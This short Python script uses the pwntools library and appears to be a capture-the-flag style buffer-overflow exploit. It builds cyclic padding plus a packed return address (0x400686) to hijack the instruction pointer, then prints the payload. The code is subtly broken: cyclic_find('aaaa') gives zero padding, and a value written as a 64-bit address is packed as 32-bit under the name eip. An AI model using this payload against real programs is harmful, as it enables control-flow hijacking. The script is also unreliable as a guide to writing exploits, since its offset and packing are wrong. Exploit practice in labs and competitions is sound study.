from pwn import *

padding = cyclic(cyclic_find('aaaa'))
eip = p32(0x0000000000400686)

payload = padding + eip

print(payload)
